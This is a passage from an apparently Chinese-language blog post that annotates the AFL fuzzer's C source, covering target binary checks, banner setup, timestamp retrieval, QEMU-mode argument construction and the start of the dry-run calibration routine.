*/</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strchr</span>((<span class="keyword">char</span> *)fname, <span class="string">&#x27;/&#x27;</span>) || !(env_path = getenv(<span class="string">&quot;PATH&quot;</span>))) &#123;</span><br><span class="line">    <span class="comment">/* 情况1：fname包含&#x27;/&#x27;（绝对或相对路径）或 PATH环境变量不存在 */</span></span><br><span class="line">    target_path = ck_strdup(fname);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 验证文件：存在、是常规文件、可执行、大小&gt;=4字节 */</span></span><br><span class="line">    <span class="keyword">if</span> (stat(target_path, &amp;st) || !S_ISREG(st.st_mode) ||</span><br><span class="line">        !(st.st_mode &amp; <span class="number">0111</span>) || (f_len = st.st_size) &lt; <span class="number">4</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Program &#x27;%s&#x27; not found or not executable&quot;</span>, fname);</span><br><span class="line">      </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 情况2：在PATH环境变量中搜索可执行文件 */</span></span><br><span class="line">    <span class="keyword">while</span> (env_path) &#123;</span><br><span class="line">      u8 *cur_elem, *delim = <span class="built_in">strchr</span>((<span class="keyword">char</span> *)env_path, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 提取PATH中的一个目录（以:分隔） */</span></span><br><span class="line">      <span class="keyword">if</span> (delim) &#123;</span><br><span class="line">        cur_elem = ck_alloc(delim - env_path + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(cur_elem, env_path, delim - env_path);</span><br><span class="line">        delim++;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        cur_elem = ck_strdup(env_path);  <span class="comment">// 最后一个元素</span></span><br><span class="line">      </span><br><span class="line">      env_path = delim;  <span class="comment">// 移到下一个PATH元素</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 构造完整路径 */</span></span><br><span class="line">      <span class="keyword">if</span> (cur_elem[<span class="number">0</span>])</span><br><span class="line">        target_path = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, cur_elem, fname);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        target_path = ck_strdup(fname);  <span class="comment">// 空元素，使用当前目录</span></span><br><span class="line">      </span><br><span class="line">      ck_free(cur_elem);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 检查文件是否存在且可执行 */</span></span><br><span class="line">      <span class="keyword">if</span> (!stat(target_path, &amp;st) &amp;&amp; S_ISREG(st.st_mode) &amp;&amp;</span><br><span class="line">          (st.st_mode &amp; <span class="number">0111</span>) &amp;&amp; (f_len = st.st_size) &gt;= <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">// 找到了！</span></span><br><span class="line">      </span><br><span class="line">      ck_free(target_path);</span><br><span class="line">      target_path = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!target_path)</span><br><span class="line">      FATAL(<span class="string">&quot;Program &#x27;%s&#x27; not found or not executable&quot;</span>, fname);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果设置了跳过检查的环境变量，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_SKIP_BIN_CHECK&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第二部分：基本安全检查 ===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 禁止将二进制文件放在/tmp或/var/tmp的根目录 </span></span><br><span class="line"><span class="comment">   * （可能是临时文件，容易被清理） */</span></span><br><span class="line">  <span class="keyword">if</span> ((!<span class="built_in">strncmp</span>(target_path, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>) &amp;&amp;</span><br><span class="line">       !<span class="built_in">strchr</span>((<span class="keyword">char</span> *)target_path + <span class="number">5</span>, <span class="string">&#x27;/&#x27;</span>)) ||</span><br><span class="line">      (!<span class="built_in">strncmp</span>(target_path, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">       !<span class="built_in">strchr</span>((<span class="keyword">char</span> *)target_path + <span class="number">9</span>, <span class="string">&#x27;/&#x27;</span>)))</span><br><span class="line">    FATAL(<span class="string">&quot;Please don&#x27;t keep binaries in /tmp or /var/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第三部分：读取文件内容进行深度检查 ===== */</span></span><br><span class="line">  </span><br><span class="line">  fd = open(target_path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, target_path);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 使用mmap将文件映射到内存（高效读取） */</span></span><br><span class="line">  f_data = mmap(<span class="number">0</span>, f_len, PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (f_data == MAP_FAILED)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to mmap file &#x27;%s&#x27;&quot;</span>, target_path);</span><br><span class="line">  </span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第四部分：文件类型检查 ===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查是否是shell脚本（以#!开头） */</span></span><br><span class="line">  <span class="keyword">if</span> (f_data[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> &amp;&amp; f_data[<span class="number">1</span>] == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Oops, the target binary looks like a shell &quot;</span></span><br><span class="line">         <span class="string">&quot;script. Some build systems will\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    sometimes generate shell stubs for dynamically linked programs; &quot;</span></span><br><span class="line">         <span class="string">&quot;try static\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    library mode (./configure --disable-shared) if that&#x27;s the &quot;</span></span><br><span class="line">         <span class="string">&quot;case.\n\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    Another possible cause is that you are actually trying to use a &quot;</span></span><br><span class="line">         <span class="string">&quot;shell\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    wrapper around the fuzzed component. Invoking shell can slow &quot;</span></span><br><span class="line">         <span class="string">&quot;down the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    fuzzing process by a factor of 20x or more; it&#x27;s best to write &quot;</span></span><br><span class="line">         <span class="string">&quot;the wrapper\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    in a compiled language instead.\n&quot;</span>);</span><br><span class="line">    FATAL(<span class="string">&quot;Program &#x27;%s&#x27; is a shell script&quot;</span>, target_path);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __APPLE__</span></span><br><span class="line">  <span class="comment">/* Linux：检查ELF文件格式（0x7F + &quot;ELF&quot;） */</span></span><br><span class="line">  <span class="keyword">if</span> (f_data[<span class="number">0</span>] != <span class="number">0x7f</span> || <span class="built_in">memcmp</span>(f_data + <span class="number">1</span>, <span class="string">&quot;ELF&quot;</span>, <span class="number">3</span>))</span><br><span class="line">    FATAL(<span class="string">&quot;Program &#x27;%s&#x27; is not an ELF binary&quot;</span>, target_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="comment">/* macOS：检查Mach-O文件格式（0xCF 0xFA 0xED） */</span></span><br><span class="line">  <span class="keyword">if</span> (f_data[<span class="number">0</span>] != <span class="number">0xCF</span> || f_data[<span class="number">1</span>] != <span class="number">0xFA</span> || f_data[<span class="number">2</span>] != <span class="number">0xED</span>)</span><br><span class="line">    FATAL(<span class="string">&quot;Program &#x27;%s&#x27; is not a 64-bit Mach-O binary&quot;</span>, target_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第五部分：插桩检查 ===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 非QEMU模式和非dumb模式下，检查是否有AFL插桩 </span></span><br><span class="line"><span class="comment">   * 通过查找SHM_ENV_VAR字符串（AFL的共享内存环境变量名） */</span></span><br><span class="line">  <span class="keyword">if</span> (!qemu_mode &amp;&amp; !dumb_mode &amp;&amp;</span><br><span class="line">      !memmem(f_data, f_len, SHM_ENV_VAR, <span class="built_in">strlen</span>(SHM_ENV_VAR) + <span class="number">1</span>)) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Looks like the target binary is not &quot;</span></span><br><span class="line">         <span class="string">&quot;instrumented! The fuzzer depends on\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    compile-time instrumentation to isolate interesting test cases &quot;</span></span><br><span class="line">         <span class="string">&quot;while\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    mutating the input data. For more information, and for tips on &quot;</span></span><br><span class="line">         <span class="string">&quot;how to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    instrument binaries, please see %s/README.\n\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    When source code is not available, you may be able to leverage &quot;</span></span><br><span class="line">         <span class="string">&quot;QEMU\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    mode support. Consult the README for tips on how to enable this.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (It is also possible to use afl-fuzz as a traditional, \&quot;dumb\&quot; &quot;</span></span><br><span class="line">         <span class="string">&quot;fuzzer.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    For that, you can use the -n option - but expect much worse &quot;</span></span><br><span class="line">         <span class="string">&quot;results.)\n&quot;</span>,</span><br><span class="line">         doc_path);</span><br><span class="line">    FATAL(<span class="string">&quot;No instrumentation detected&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* QEMU模式下不应该有AFL插桩（会很慢且无益） */</span></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode &amp;&amp;</span><br><span class="line">      memmem(f_data, f_len, SHM_ENV_VAR, <span class="built_in">strlen</span>(SHM_ENV_VAR) + <span class="number">1</span>)) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;This program appears to be instrumented with &quot;</span></span><br><span class="line">         <span class="string">&quot;afl-gcc, but is being run in\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    QEMU mode (-Q). This is probably not what you want - this setup &quot;</span></span><br><span class="line">         <span class="string">&quot;will be\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    slow and offer no practical benefits.\n&quot;</span>);</span><br><span class="line">    FATAL(<span class="string">&quot;Instrumentation found in -Q mode&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第六部分：特殊功能检测 ===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检测是否使用了ASAN或MSAN（内存错误检测工具） */</span></span><br><span class="line">  <span class="keyword">if</span> (memmem(f_data, f_len, <span class="string">&quot;libasan.so&quot;</span>, <span class="number">10</span>) ||</span><br><span class="line">      memmem(f_data, f_len, <span class="string">&quot;__msan_init&quot;</span>, <span class="number">11</span>))</span><br><span class="line">    uses_asan = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检测持久模式（Persistent mode）标志 </span></span><br><span class="line"><span class="comment">   * 持久模式允许在单个进程中多次执行测试，提高性能 */</span></span><br><span class="line">  <span class="keyword">if</span> (memmem(f_data, f_len, PERSIST_SIG, <span class="built_in">strlen</span>(PERSIST_SIG) + <span class="number">1</span>)) &#123;</span><br><span class="line">    OKF(cPIN <span class="string">&quot;Persistent mode binary detected.&quot;</span>);</span><br><span class="line">    setenv(PERSIST_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    persistent_mode = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_PERSISTENT&quot;</span>)) &#123;</span><br><span class="line">    WARNF(<span class="string">&quot;AFL_PERSISTENT is no longer supported and may misbehave!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检测延迟初始化（Deferred forkserver）标志</span></span><br><span class="line"><span class="comment">   * 允许目标程序完成初始化后再启动forkserver，提高性能 */</span></span><br><span class="line">  <span class="keyword">if</span> (memmem(f_data, f_len, DEFER_SIG, <span class="built_in">strlen</span>(DEFER_SIG) + <span class="number">1</span>)) &#123;</span><br><span class="line">    OKF(cPIN <span class="string">&quot;Deferred forkserver binary detected.&quot;</span>);</span><br><span class="line">    setenv(DEFER_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    deferred_mode = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_DEFER_FORKSRV&quot;</span>)) &#123;</span><br><span class="line">    WARNF(<span class="string">&quot;AFL_DEFER_FORKSRV is no longer supported and may misbehave!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 释放内存映射 */</span></span><br><span class="line">  <span class="keyword">if</span> (munmap(f_data, f_len))</span><br><span class="line">    PFATAL(<span class="string">&quot;unmap() failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Trim and possibly create a banner for the run. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_up_banner</span><span class="params">(u8 *name)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* ========== 1. 检查是否已设置 banner ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (!use_banner) <span class="comment">// 如果还没有设置过 banner</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* ========== 2. 根据运行模式选择 banner ========== */</span></span><br><span class="line">    <span class="keyword">if</span> (sync_id) <span class="comment">// 并行模式：使用同步ID作为标识</span></span><br><span class="line">    &#123;</span><br><span class="line">      use_banner = sync_id; <span class="comment">// 例如：&quot;master&quot;, &quot;slave1&quot;, &quot;fuzzer2&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span>                  <span class="comment">// 单机模式：从目标程序路径提取文件名</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 查找最后一个路径分隔符 &#x27;/&#x27;</span></span><br><span class="line">      u8 *trim = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)name, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!trim)           <span class="comment">// 没有路径分隔符，说明就是文件名</span></span><br><span class="line">        use_banner = name; <span class="comment">// 直接使用整个name</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        use_banner = trim + <span class="number">1</span>; <span class="comment">// 跳过 &#x27;/&#x27;，使用文件名部分</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 3. 长度限制和截断处理 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(use_banner) &gt; <span class="number">40</span>) <span class="comment">// 如果banner太长（影响界面显示）</span></span><br><span class="line">  &#123;</span><br><span class="line">    u8 *tmp = ck_alloc(<span class="number">44</span>);               <span class="comment">// 分配新内存：40字符 + &quot;...&quot; + &#x27;\0&#x27;</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%.40s...&quot;</span>, use_banner); <span class="comment">// 截取前40字符并添加&quot;...&quot;</span></span><br><span class="line">    use_banner = tmp;                     <span class="comment">// 使用截断后的版本</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="具体功能模块"><a href="#具体功能模块" class="headerlink" title="具体功能模块"></a>具体功能模块</h3><ol><li>文件定位与基本验证<ul><li>支持绝对路径、相对路径和PATH搜索</li><li>验证文件存在性、可执行权限、文件大小</li></ul></li><li>安全性检查<ul><li>禁止在临时目录存放目标程序</li><li>防止使用不稳定的文件</li></ul></li><li>文件格式验证<ul><li>拒绝shell脚本（性能太差）</li><li>验证二进制格式（Linux的ELF或macOS的Mach-O）</li></ul></li><li>插桩状态检测<ul><li>确认程序已被AFL插桩（除非使用QEMU或dumb模式）</li><li>防止模式冲突（QEMU模式不应有插桩）</li></ul></li><li>特殊功能识别<ul><li>检测ASAN/MSAN（内存错误检测）</li><li>识别持久模式（性能优化）</li><li>识别延迟forkserver（性能优化）</li></ul></li></ol><h2 id="get-cur-time"><a href="#get-cur-time" class="headerlink" title="get_cur_time"></a>get_cur_time</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 获取当前时间戳（毫秒级精度） */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u64 <span class="title">get_cur_time</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span>     <span class="comment">// 用于存储时间值的结构体（秒和微秒）</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span>    <span class="comment">// 用于存储时区信息的结构体（AFL中未使用）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 调用系统函数获取当前时间</span></span><br><span class="line"><span class="comment">   * 第一个参数：存储时间值</span></span><br><span class="line"><span class="comment">   * 第二个参数：存储时区信息（这里传入但不使用）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将时间转换为毫秒值并返回</span></span><br><span class="line"><span class="comment">   * tv.tv_sec：秒数，乘以1000转换为毫秒</span></span><br><span class="line"><span class="comment">   * tv.tv_usec：微秒数，除以1000转换为毫秒</span></span><br><span class="line"><span class="comment">   * 两者相加得到总的毫秒数</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> (tv.tv_sec * <span class="number">1000ULL</span>) + (tv.tv_usec / <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>作用</strong>：获取系统当前时间戳，精度为毫秒级</p><p><strong>返回值</strong>：返回一个64位无符号整数，表示从Unix纪元（1970年1月1日）开始到现在的毫秒数</p><p><strong>使用场景</strong>：在AFL中主要用于：</p><ul><li>计算模糊测试运行时间</li><li>性能统计和监控</li><li>超时检测</li><li>时间戳记录</li></ul><h2 id="get-qemu-argv"><a href="#get-qemu-argv" class="headerlink" title="get_qemu_argv"></a>get_qemu_argv</h2><p>这是 AFL 中用于构建 QEMU 模式命令行参数的函数。QEMU 模式允许 AFL 对没有源码的二进制程序进行模糊测试。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> **<span class="title">get_qemu_argv</span><span class="params">(u8 *own_loc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> argc)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 分配新的参数数组，大小为原参数个数+4</span></span><br><span class="line"><span class="comment">   * 需要额外空间来添加 QEMU 相关参数 */</span></span><br><span class="line">  <span class="keyword">char</span> **new_argv = ck_alloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) * (argc + <span class="number">4</span>));</span><br><span class="line">  u8 *tmp, *cp, *rsl, *own_copy;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 设置环境变量，解决 QEMU 稳定性问题</span></span><br><span class="line"><span class="comment">   * nochain: 禁用 QEMU 的 TB(Translation Block) 链接优化，提高稳定性 */</span></span><br><span class="line">  setenv(<span class="string">&quot;QEMU_LOG&quot;</span>, <span class="string">&quot;nochain&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 复制原始参数到新数组，从索引3开始</span></span><br><span class="line"><span class="comment">   * argv[0] 将是 afl-qemu-trace</span></span><br><span class="line"><span class="comment">   * argv[1] 将是 &quot;--&quot;</span></span><br><span class="line"><span class="comment">   * argv[2] 将是目标程序路径</span></span><br><span class="line"><span class="comment">   * argv[3+] 是原始参数 */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(new_argv + <span class="number">3</span>, argv + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) * argc);</span><br><span class="line">  </span><br><span class="line">  new_argv[<span class="number">2</span>] = target_path;  <span class="comment">// 设置目标程序路径</span></span><br><span class="line">  new_argv[<span class="number">1</span>] = <span class="string">&quot;--&quot;</span>;         <span class="comment">// QEMU 参数分隔符</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 查找 afl-qemu-trace 二进制文件 ========== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 方法1：从 AFL_PATH 环境变量指定的路径查找 */</span></span><br><span class="line">  tmp = getenv(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (tmp) &#123;</span><br><span class="line">    cp = alloc_printf(<span class="string">&quot;%s/afl-qemu-trace&quot;</span>, tmp);  <span class="comment">// 构建完整路径</span></span><br><span class="line">    <span class="keyword">if</span> (access(cp, X_OK))  <span class="comment">// 检查文件是否存在且可执行</span></span><br><span class="line">      FATAL(<span class="string">&quot;Unable to find &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">    target_path = new_argv[<span class="number">0</span>] = cp;  <span class="comment">// 设置为第一个参数</span></span><br><span class="line">    <span class="keyword">return</span> new_argv;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 方法2：从 AFL 自身所在目录查找 */</span></span><br><span class="line">  own_copy = ck_strdup(own_loc);  <span class="comment">// 复制 AFL 自身路径</span></span><br><span class="line">  rsl = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)own_copy, <span class="string">&#x27;/&#x27;</span>);  <span class="comment">// 找到最后一个 &#x27;/&#x27; </span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (rsl) &#123;</span><br><span class="line">    *rsl = <span class="number">0</span>;  <span class="comment">// 截断字符串，获取目录路径</span></span><br><span class="line">    cp = alloc_printf(<span class="string">&quot;%s/afl-qemu-trace&quot;</span>, own_copy);  <span class="comment">// 构建路径</span></span><br><span class="line">    ck_free(own_copy);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!access(cp, X_OK)) &#123;  <span class="comment">// 检查文件是否可执行</span></span><br><span class="line">      target_path = new_argv[<span class="number">0</span>] = cp;</span><br><span class="line">      <span class="keyword">return</span> new_argv;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    ck_free(own_copy);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 方法3：从编译时指定的 BIN_PATH 查找 */</span></span><br><span class="line">  <span class="keyword">if</span> (!access(BIN_PATH <span class="string">&quot;/afl-qemu-trace&quot;</span>, X_OK)) &#123;</span><br><span class="line">    target_path = new_argv[<span class="number">0</span>] = ck_strdup(BIN_PATH <span class="string">&quot;/afl-qemu-trace&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> new_argv;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 所有方法都失败，输出错误信息 */</span></span><br><span class="line">  SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST </span><br><span class="line">       <span class="string">&quot;Oops, unable to find the &#x27;afl-qemu-trace&#x27; binary. The binary must be built\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    separately by following the instructions in qemu_mode/README.qemu. If you\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    already have the binary installed, you may need to specify AFL_PATH in the\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    environment.\n\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    Of course, even without QEMU, afl-fuzz can still work with binaries that are\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    instrumented at compile time with afl-gcc. It is also possible to use it as a\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    traditional \&quot;dumb\&quot; fuzzer by specifying &#x27;-n&#x27; in the command line.\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  FATAL(<span class="string">&quot;Failed to locate &#x27;afl-qemu-trace&#x27;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p><code>perform_dry_run</code> 是 AFL (American Fuzzy Lop) 模糊测试工具中的一个关键函数，用于在正式模糊测试开始前对所有初始测试用例进行预运行验证。这个”干运行”过程确保所有种子输入都能正常工作，并收集基准性能数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 获取测试用例队列的头指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span> =</span> <span class="built_in">queue</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 记录校准失败的测试用例数量</span></span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 检查环境变量，决定是否跳过导致崩溃的测试用例</span></span><br><span class="line">  u8 *skip_crashes = getenv(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历所有队列中的测试用例</span></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    u8 *use_mem;  <span class="comment">// 存储测试用例内容的内存缓冲区</span></span><br><span class="line">    u8 res;       <span class="comment">// 校准结果</span></span><br><span class="line">    s32 fd;       <span class="comment">// 文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提取文件名（去掉路径，只保留文件名部分）</span></span><br><span class="line">    u8 *fn = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出当前正在处理的测试用例信息</span></span><br><span class="line">    ACTF(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开测试用例文件</span></span><br><span class="line">    fd = open(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存存储测试用例内容（不初始化为零）</span></span><br><span class="line">    use_mem = ck_alloc_nozero(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取测试用例内容到内存</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      FATAL(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对测试用例进行校准，收集执行信息</span></span><br><span class="line">    <span class="comment">// 参数：命令行参数、队列项、输入数据、阶段（0）、是否第一次运行（1）</span></span><br><span class="line">    res = calibrate_case(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    ck_free(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果收到停止信号，立即返回</span></span><br><span class="line">    <span class="keyword">if</span> (stop_soon)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是崩溃模式或没有新的覆盖信息，输出执行统计</span></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST,</span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据不同的执行结果进行处理</span></span><br><span class="line">    <span class="keyword">switch</span> (res) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NONE:  <span class="comment">// 正常执行，无错误</span></span><br><span class="line">      <span class="comment">// 如果是第一个测试用例，检查代码覆盖率</span></span><br><span class="line">      <span class="keyword">if</span> (q == <span class="built_in">queue</span>)</span><br><span class="line">        check_map_coverage();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 在崩溃模式下，如果测试用例不崩溃则报错</span></span><br><span class="line">      <span class="keyword">if</span> (crash_mode)</span><br><span class="line">        FATAL(<span 